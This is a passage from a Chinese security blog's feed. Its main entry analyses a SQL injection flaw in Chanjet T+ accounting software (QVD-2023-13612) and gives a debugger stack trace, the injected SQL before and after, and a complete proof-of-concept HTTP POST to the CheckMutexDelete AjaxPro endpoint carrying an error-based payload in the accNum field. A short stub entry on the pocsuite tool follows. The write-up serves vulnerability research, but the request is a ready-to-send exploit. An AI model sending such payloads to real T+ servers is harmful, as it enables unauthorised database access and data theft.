class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Ufida.T.SM.UIP.dll!Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(<span class="built_in">string</span> url, <span class="built_in">string</span> accNum, <span class="built_in">string</span> functionTag) (IL=prolog, Native=<span class="number">0x00007FF8F4474D30</span>+<span class="number">0x0</span>)</span><br><span class="line"> [本机到托管的转换]</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.UnsafeInvokeInternal(<span class="built_in">object</span> obj, <span class="built_in">object</span>[] parameters, <span class="built_in">object</span>[] arguments) (IL≈<span class="number">0x0016</span>, Native=<span class="number">0x00007FF94CA3F9A0</span>+<span class="number">0x84</span>)</span><br><span class="line"> mscorlib.dll!System.Reflection.RuntimeMethodInfo.Invoke(<span class="built_in">object</span> obj, System.Reflection.BindingFlags invokeAttr, System.Reflection.Binder binder, <span class="built_in">object</span>[] parameters, System.Globalization.CultureInfo culture) (IL=epilog, Native=<span class="number">0x00007FF94CA57300</span>+<span class="number">0x92</span>)</span><br><span class="line"> mscorlib.dll!System.Reflection.MethodBase.Invoke(<span class="built_in">object</span> obj, <span class="built_in">object</span>[] parameters) (IL=epilog, Native=<span class="number">0x00007FF94CAD6AE0</span>+<span class="number">0x22</span>)</span><br><span class="line"> AjaxPro<span class="number">.2</span>.dll!AjaxPro.AjaxProcHelper.Run() (IL≈<span class="number">0x066C</span>, Native=<span class="number">0x00007FF8F44599A0</span>+<span class="number">0xAD3</span>)</span><br><span class="line"> AjaxPro<span class="number">.2</span>.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context) (IL=<span class="number">0x0010</span>, Native=<span class="number">0x00007FF8F4459900</span>+<span class="number">0x3A</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute() (IL≈<span class="number">0x018D</span>, Native=<span class="number">0x00007FF93CA37CD0</span>+<span class="number">0x21E</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStepImpl(System.Web.HttpApplication.IExecutionStep step) (IL=epilog, Native=<span class="number">0x00007FF93C9FADA0</span>+<span class="number">0x4B</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.ExecuteStep(System.Web.HttpApplication.IExecutionStep step, <span class="keyword">ref</span> <span class="built_in">bool</span> completedSynchronously) (IL≈<span class="number">0x0015</span>, Native=<span class="number">0x00007FF93C9FAE00</span>+<span class="number">0x5D</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.PipelineStepManager.ResumeSteps(System.Exception error) (IL≈<span class="number">0x027A</span>, Native=<span class="number">0x00007FF93CA0E650</span>+<span class="number">0x5CF</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpApplication.BeginProcessRequestNotification(System.Web.HttpContext context, System.AsyncCallback cb) (IL=<span class="number">0x0031</span>, Native=<span class="number">0x00007FF93C9F9AB0</span>+<span class="number">0x7D</span>)</span><br><span class="line"> System.Web.dll!System.Web.HttpRuntime.ProcessRequestNotificationPrivate(System.Web.Hosting.IIS7WorkerRequest wr, System.Web.HttpContext context) (IL≈<span class="number">0x00B0</span>, Native=<span class="number">0x00007FF93CA0CCA0</span>+<span class="number">0xE0</span>)</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x0131</span>, Native=<span class="number">0x00007FF93C9FBE90</span>+<span class="number">0x4DC</span>)</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x0000</span>, Native=<span class="number">0x00007FF93C9FBE50</span>+<span class="number">0x14</span>)</span><br><span class="line"> [托管到本机的转换]</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotificationHelper(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x01E7</span>, Native=<span class="number">0x00007FF93C9FBE90</span>+<span class="number">0x607</span>)</span><br><span class="line"> System.Web.dll!System.Web.Hosting.PipelineRuntime.ProcessRequestNotification(System.IntPtr rootedObjectsPointer, System.IntPtr nativeRequestContext, System.IntPtr moduleData, <span class="built_in">int</span> flags) (IL≈<span class="number">0x0000</span>, Native=<span class="number">0x00007FF93C9FBE50</span>+<span class="number">0x14</span>)</span><br><span class="line"> [程序域转换]</span><br></pre></td></tr></table></figure><p>主要看方法 <code>Ufida.T.SM.UIP.dll!Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(string url, string accNum, string functionTag) </code></p><p>入参如下所示：</p><p>其中 <code>CheckMutex</code> 的属性为 <code>AjaxMethod</code> ，然后我们根据入参提供对应的参数即可。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240418164228754.png" class="" title="CheckMutex"><p>可以看到需要满足 <code>functionTag</code> 为 <code>SYS0104</code>，才能执行 <code>CheckUserFunction</code> 函数，而 <code>CheckUserFunction</code> 执行的就是 <code>accNum</code> 的值。</p><p>然后在执行畅捷通接口 <code>Ufida.T.EAP.Mutex.Interface.IMutex.CheckUserFunction</code> 时报了异常，但是仍然执行了 SQL 。</p><img src="/A_%E5%86%85%E5%8A%9F/A_POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/%E3%80%90QVD-2023-13612%E3%80%91%E7%95%85%E6%8D%B7%E9%80%9ASQL%E6%B3%A8%E5%85%A5/image-20240418165341199.png" class="" title="image-20240418165341199"><p>在异常信息中可以看到</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$exception.SqlString <span class="operator">=</span> &quot;select id,UseLogID,Acaa_Num,UserID,UserName,PersonName,Url,HostAddress,HostName,FunctionTag,FunctionName,BeginTime,State,Version,Description,TaskID,ModelClassType,ModelType,ClientType,ServerAddress from EAP_Mutex with(nolock) where userid &lt;&gt;  N&#x27;&#x27; and Acaa_Num =  N&#x27;3&#x27;and (select @@version)&gt;0-- N&#x27; and  Version = &#x27;YWTPro N&#x27; order by begintime&quot;</span><br></pre></td></tr></table></figure><p>可以看下注入前与注入后的SQL语句对比：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">select</span>   </span><br><span class="line">    id,  </span><br><span class="line">    UseLogID,  </span><br><span class="line">    Acaa_Num,  </span><br><span class="line">    UserID,  </span><br><span class="line">    UserName,  </span><br><span class="line">    PersonName,  </span><br><span class="line">    Url,  </span><br><span class="line">    HostAddress,  </span><br><span class="line">    HostName,  </span><br><span class="line">    FunctionTag,  </span><br><span class="line">    FunctionName,  </span><br><span class="line">    BeginTime,  </span><br><span class="line">    State,  </span><br><span class="line">    Version,  </span><br><span class="line">    Description,  </span><br><span class="line">    TaskID,  </span><br><span class="line">    ModelClassType,  </span><br><span class="line">    ModelType,  </span><br><span class="line">    ClientType,  </span><br><span class="line">    ServerAddress</span><br><span class="line"><span class="keyword">from</span> EAP_Mutex</span><br><span class="line"><span class="keyword">with</span>(nolock)</span><br><span class="line"># 上边代码一致</span><br><span class="line"># 注入前</span><br><span class="line"><span class="keyword">where</span>   </span><br><span class="line">    userid <span class="operator">&lt;&gt;</span> N<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span>   </span><br><span class="line">    Acaa_Num <span class="operator">=</span> N<span class="string">&#x27;3N&#x27;</span> <span class="keyword">and</span>   </span><br><span class="line">    Version <span class="operator">=</span> <span class="string">&#x27;YWTPro N&#x27;</span></span><br><span class="line"># 注入后</span><br><span class="line"><span class="keyword">where</span>   </span><br><span class="line">    userid <span class="operator">&lt;&gt;</span> N<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span>   </span><br><span class="line">    Acaa_Num <span class="operator">=</span> N<span class="string">&#x27;3&#x27;</span> <span class="keyword">and</span> </span><br><span class="line">    (<span class="keyword">select</span> @<span class="variable">@version</span>)<span class="operator">&gt;</span><span class="number">0</span><span class="comment">-- N&#x27; and </span></span><br><span class="line">    Version <span class="operator">=</span> <span class="string">&#x27;YWTPro N&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在执行时因为报错，返回了异常信息，也就返回了我们要执行的查询结果，异常捕捉的堆栈如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在 Ufida.T.EAP.Aop.Dynamic.LocalCallDynamicProxyImpl.NormalInvoke(MethodBase method, Object[] args, Boolean needFreeCuid)\r\n   </span><br><span class="line">在 Ufida.T.EAP.Aop.Dynamic.LocalCallDynamicProxyImpl.Invoke(IMessage message)\r\n   </span><br><span class="line">在 System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(MessageData&amp; msgData, Int32 type)\r\n   </span><br><span class="line">在 Ufida.T.EAP.Mutex.Interface.IMutex.CheckUserFunction(String accountNum)\r\n   </span><br><span class="line">在 Ufida.T.SM.UIP.MultiCompanyController.CheckMutex(String url, String accNum, String functionTag)</span><br></pre></td></tr></table></figure><p>使用 dnSpy 反编译之后可以看到，<strong>CheckMutexDelete</strong> 方法也可以用于该漏洞，需要在 请求体添加 <code>dsName</code> 参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutexDelete HTTP/1.1</span><br><span class="line">Host: 192.168.19.137:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/css,*/*;q=0.1</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 53</span><br><span class="line"></span><br><span class="line">&#123;&quot;accNum&quot;: &quot;3&#x27;and (select @@version)&gt;0--&quot;, &quot;functionTag&quot;: &quot;SYS0104&quot;, &quot;url&quot;: &quot;&quot;, &quot;dsName&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：畅捷通T+ SQL 注入漏洞(含POC)&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="A_内功" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/"/>
    
    <category term="A_POC探索" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"/>
    
    <category term="畅捷通" scheme="http://example.com/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"/>
    
    
  </entry>
  
  <entry>
    <title>【POC】pocsuite 用法</title>
    <link href="http://example.com/B_Code/Python/%E3%80%90POC%E3%80%91pocsuite%20%E7%94%A8%E6%B3%95/"/>
    <id>http://example.com/B_Code/Python/%E3%80%90POC%E3%80%91pocsuite%20%E7%94%A8%E6%B3%95/</id>
    <published>2024-04-01T08:26:20.115Z</published>
    <updated>2024-04-01T08:27:50.607Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>概述：pocsuite 工具的用法整理</p><p>参考链接：</p><ul><li><a href="https://www.freebuf.com/column/162868.html">工具| PocSuite 使用介绍 - FreeBuf网络安全行业门户</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;概述：pocsuite 工具的用法整理&lt;/p&gt;
&lt;p&gt;参考链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/column/162868.html&quot;&gt;工具| PocSuite 使用介绍 - FreeB</summary>
      
    
    
    
    <category term="B_Code" scheme="http://example.com/categories/B-Code/"/>
    
    <category term="Python" scheme="http://example.com/categories/B-Code/Python/"/>
    
    
  </entry>
  
</feed>
